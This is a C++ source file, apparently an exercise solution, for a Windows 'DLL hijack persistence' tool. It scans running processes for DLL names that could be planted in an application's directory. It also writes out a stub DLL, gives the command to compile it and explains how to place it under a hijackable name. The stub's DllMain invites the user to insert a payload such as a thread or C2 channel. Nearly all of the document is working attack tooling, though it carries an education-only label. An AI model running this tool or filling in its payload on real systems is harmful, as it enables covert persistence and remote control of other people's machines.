/*
  Solution 02 — DLL Hijack Persistence Simulator
  ================================================
  For authorized testing / education only.

  Usage:
    sol02.exe scan                     — find hijack opportunities across running processes
    sol02.exe genstub <output_path>    — write stub DLL source + print compile command

  How the scanner works:
    For every loaded DLL in every running process, check whether:
      a) The DLL is loaded from a system path (C:\Windows\*)
      b) The process's own directory does NOT contain a same-named DLL
    If both are true, planting that DLL name in the process directory would
    cause it to be loaded instead of the system copy on the next run.

  Compile:
    g++ -std=c++17 -Wall -o sol02.exe sol02_dll_hijack.cpp -ladvapi32 -lpsapi
*/

#include <windows.h>
#include <tlhelp32.h>
#include <psapi.h>
#include <iostream>
#include <string>
#include <vector>
#include <set>
#include <algorithm>
#include <iomanip>
#include <fstream>
#include <sstream>

// ── helpers ───────────────────────────────────────────────────────────────────

static std::string toLower(std::string s) {
    std::transform(s.begin(), s.end(), s.begin(), ::tolower);
    return s;
}

static std::string dirOf(const std::string& path) {
    auto pos = path.rfind('\\');
    return (pos == std::string::npos) ? "" : path.substr(0, pos);
}

static std::string fileOf(const std::string& path) {
    auto pos = path.rfind('\\');
    return (pos == std::string::npos) ? path : path.substr(pos + 1);
}

static bool isSystemPath(const std::string& path) {
    std::string lp = toLower(path);
    return lp.find("c:\\windows\\") == 0 ||
           lp.find("c:\\program files\\") == 0 ||
           lp.find("c:\\program files (x86)\\") == 0;
}

static bool fileExists(const std::string& path) {
    return GetFileAttributesA(path.c_str()) != INVALID_FILE_ATTRIBUTES;
}

// ─────────────────────────────────────────────────────────────────────────────
// Get full exe path for a process
// ─────────────────────────────────────────────────────────────────────────────
static std::string getExePath(DWORD pid) {
    HANDLE hProc = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pid);
    if (!hProc) return "";
    char buf[MAX_PATH] = {};
    GetModuleFileNameExA(hProc, nullptr, buf, MAX_PATH);
    CloseHandle(hProc);
    return std::string(buf);
}

// ─────────────────────────────────────────────────────────────────────────────
// Enumerate all loaded modules for a PID
// ─────────────────────────────────────────────────────────────────────────────
struct ModuleInfo {
    std::string name;      // just the filename (lowercase)
    std::string fullPath;  // full load path
};

static std::vector<ModuleInfo> getModules(DWORD pid) {
    std::vector<ModuleInfo> result;
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE | TH32CS_SNAPMODULE32, pid);
    if (snap == INVALID_HANDLE_VALUE) return result;

    MODULEENTRY32 me = {};
    me.dwSize = sizeof(me);
    if (Module32First(snap, &me)) {
        do {
            ModuleInfo mi;
            mi.name     = toLower(me.szModule);
            mi.fullPath = me.szExePath;
            result.push_back(mi);
        } while (Module32Next(snap, &me));
    }
    CloseHandle(snap);
    return result;
}

// ─────────────────────────────────────────────────────────────────────────────
// Struct for a hijack finding
// ─────────────────────────────────────────────────────────────────────────────
struct HijackOpportunity {
    DWORD       pid;
    std::string processName;
    std::string processDir;
    std::string dllName;
    std::string loadedFrom;
};

// ─────────────────────────────────────────────────────────────────────────────
// MODE: scan
// ─────────────────────────────────────────────────────────────────────────────
static int modeScan() {
    std::cout << "[scan] Enumerating processes for DLL hijack opportunities ...\n\n";

    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) {
        std::cerr << "CreateToolhelp32Snapshot failed: " << GetLastError() << "\n";
        return 1;
    }

    std::vector<HijackOpportunity> findings;

    PROCESSENTRY32 pe = {};
    pe.dwSize = sizeof(pe);
    if (!Process32First(snap, &pe)) {
        CloseHandle(snap);
        return 1;
    }

    do {
        DWORD pid = pe.th32ProcessID;
        if (pid == 0 || pid == 4) continue; // skip Idle and System

        std::string exePath  = getExePath(pid);
        if (exePath.empty()) continue;
        std::string procDir  = dirOf(exePath);
        std::string procName = pe.szExeFile;

        // Skip processes whose exe is in a system directory
        if (isSystemPath(exePath)) continue;

        auto modules = getModules(pid);
        for (const auto& mod : modules) {
            if (mod.fullPath.empty()) continue;
            if (!isSystemPath(mod.fullPath)) continue; // only flag system-loaded DLLs

            // Check whether procDir already contains this DLL name
            std::string candidate = procDir + "\\" + fileOf(mod.fullPath);
            if (!fileExists(candidate)) {
                // Hijack opportunity: process loads DLL from system dir but
                // process directory has no such DLL
                HijackOpportunity op;
                op.pid         = pid;
                op.processName = procName;
                op.processDir  = procDir;
                op.dllName     = fileOf(mod.fullPath);
                op.loadedFrom  = mod.fullPath;
                findings.push_back(op);
            }
        }
    } while (Process32Next(snap, &pe));
    CloseHandle(snap);

    if (findings.empty()) {
        std::cout << "No hijack opportunities found in non-system processes.\n";
        return 0;
    }

    std::cout << std::left
              << std::setw(8)  << "PID"
              << std::setw(28) << "Process"
              << std::setw(26) << "DLL (hijackable name)"
              << "Loaded from (system)\n";
    std::cout << std::string(110, '-') << "\n";

    // Deduplicate by (pid, dllName)
    std::set<std::pair<DWORD,std::string>> seen;
    for (const auto& f : findings) {
        auto key = std::make_pair(f.pid, toLower(f.dllName));
        if (!seen.insert(key).second) continue;
        std::cout << std::setw(8)  << f.pid
                  << std::setw(28) << (f.processName.size() > 26 ? f.processName.substr(0,25)+"~" : f.processName)
                  << std::setw(26) << f.dllName
                  << f.loadedFrom << "\n";
    }
    std::cout << "\n" << seen.size() << " unique opportunity/ies found.\n"
              << "Plant a DLL with the listed name in the process directory "
              << "to hijack load order.\n";
    return 0;
}

// ─────────────────────────────────────────────────────────────────────────────
// Stub DLL source template
// ─────────────────────────────────────────────────────────────────────────────
static const char* STUB_SOURCE =
    "/*\n"
    "  Stub DLL — hijack placeholder\n"
    "  Compile: see genstub output\n"
    "*/\n"
    "#include <windows.h>\n"
    "\n"
    "// Forward-declare the real export if the DLL must proxy calls.\n"
    "// For a simple persistence stub we only need DllMain.\n"
    "\n"
    "BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {\n"
    "    (void)hinstDLL; (void)lpvReserved;\n"
    "    switch (fdwReason) {\n"
    "    case DLL_PROCESS_ATTACH:\n"
    "        OutputDebugStringA(\"[DllHijack] Stub loaded in process\\n\");\n"
    "        // Insert your payload here — e.g. spawn a thread, establish C2\n"
    "        break;\n"
    "    case DLL_PROCESS_DETACH:\n"
    "        OutputDebugStringA(\"[DllHijack] Stub unloaded\\n\");\n"
    "        break;\n"
    "    }\n"
    "    return TRUE;\n"
    "}\n";

// ─────────────────────────────────────────────────────────────────────────────
// MODE: genstub <output_dll_path>
// ─────────────────────────────────────────────────────────────────────────────
static int modeGenstub(const std::string& outputDllPath) {
    // Derive source file path: same as output but with .cpp appended
    std::string srcPath = outputDllPath + ".cpp";

    std::cout << "[genstub] Writing stub DLL source to:\n  " << srcPath << "\n\n";

    HANDLE hFile = CreateFileA(srcPath.c_str(), GENERIC_WRITE, 0, nullptr,
                               CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
    if (hFile == INVALID_HANDLE_VALUE) {
        std::cerr << "Cannot create file: " << srcPath
                  << "  Error: " << GetLastError() << "\n";
        return 1;
    }

    DWORD written = 0;
    DWORD srcLen  = static_cast<DWORD>(strlen(STUB_SOURCE));
    WriteFile(hFile, STUB_SOURCE, srcLen, &written, nullptr);
    CloseHandle(hFile);

    if (written != srcLen) {
        std::cerr << "Write incomplete (" << written << "/" << srcLen << " bytes).\n";
        return 1;
    }

    std::cout << "Written: " << srcPath << "\n\n";
    std::cout << "Compile command:\n"
              << "  g++ -std=c++17 -shared -o \"" << outputDllPath
              << "\" \"" << srcPath << "\"\n\n"
              << "Then copy the DLL to the target process directory under the\n"
              << "hijackable name found with: sol02.exe scan\n";
    return 0;
}

// ─────────────────────────────────────────────────────────────────────────────
int main(int argc, char* argv[]) {
    std::cout << "=== Solution 02: DLL Hijack Scanner / Stub Generator ===\n\n";

    if (argc < 2) {
        std::cerr << "Usage:\n"
                  << "  sol02.exe scan\n"
                  << "  sol02.exe genstub <output_dll_path>\n";
        return 1;
    }

    std::string mode = argv[1];
    if (mode == "scan") {
        return modeScan();
    } else if (mode == "genstub") {
        if (argc < 3) {
            std::cerr << "genstub requires an output DLL path.\n"
                      << "  Example: sol02.exe genstub C:\\Temp\\stub_hijack.dll\n";
            return 1;
        }
        return modeGenstub(argv[2]);
    } else {
        std::cerr << "Unknown mode '" << mode << "'. Use: scan | genstub\n";
        return 1;
    }
}
